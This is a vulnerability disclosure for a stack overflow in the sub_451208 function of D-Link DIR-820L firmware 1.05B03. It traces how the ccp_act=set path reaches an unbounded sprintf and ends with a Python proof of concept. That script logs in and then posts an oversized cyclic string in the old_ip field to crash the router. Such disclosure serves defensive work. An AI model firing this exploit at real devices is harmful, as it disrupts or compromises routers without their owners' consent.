# Vulnerability introduction

A stack overflow vulnerability exists in the sub_451208 function of D-Link DIR-820L 1.05B03.

# Vulnerability analysis

In its callback_ccp_get_set() function, pcVar10 is the ccp_act value passed in

![image](https://github.com/user-attachments/assets/996934d1-fb36-45cb-96de-8fc38da2a6b1)


When ccp_act = set is set, sub_451208 is called

![image](https://github.com/user-attachments/assets/faeca5c1-36be-4c72-914a-b3fe0e144a92)

Within the sub_451208 function, by obtaining a series of parameter values, sprintf will be used to assign values ​​without setting the buffer length, causing overflow.

![image](https://github.com/user-attachments/assets/29bbbab4-4e61-433e-af02-dfb02e632b86)

![image](https://github.com/user-attachments/assets/27903ba6-8d71-45c6-a680-eef36e794a2f)


# POC
![image](https://github.com/user-attachments/assets/4e092493-bc47-447d-808c-dc3c66fed4a7)

![image](https://github.com/user-attachments/assets/2fb5c8fc-1365-45e6-93d9-ba402b71f503)



```python
import requests

login_url = 'http://192.168.0.1/login.ccp'
headers = {
    'Host': '192.168.0.1',
    'Content-Length': '122',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'Origin': 'http://192.168.0.1',
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.58 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Referer': 'http://192.168.0.1/',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
    'Cookie': 'hasLogin=1',
    'Connection': 'close'
}
data = {
    'html_response_page': 'login.asp',
    'login_name': '',
    'login_pass': '',
    'username': 'QWRtaW4A',
    'password': '',
    'graph_id': '',
    'alert_id': '',
    'log_pass': '',
    'graph_code': ''
}
response = requests.post(login_url, headers=headers, data=data)
print(response.text)


url = 'http://192.168.0.1/get_set.ccp'
headers = {
    'Host': '192.168.0.1',
    'Content-Length': '1064',
    'Accept': 'application/xml, text/xml, */*; q=0.01',
    'X-Requested-With': 'XMLHttpRequest',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.58 Safari/537.36',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'http://192.168.0.1',
    'Referer': 'http://192.168.0.1/lan.asp',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
    'Cookie': 'hasLogin=1',
    'Connection': 'close'
}
data = {
    'ccp_act': 'set',
    'old_ip': 'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaac',
    'old_mask': '255.255.255.0',
    'new_ip': '192.168.0.1',
    'new_mask': '255.255.255.0',
    'nextPage': 'lan.asp',
}
response = requests.post(url, headers=headers, data=data)
print(response.text)
```
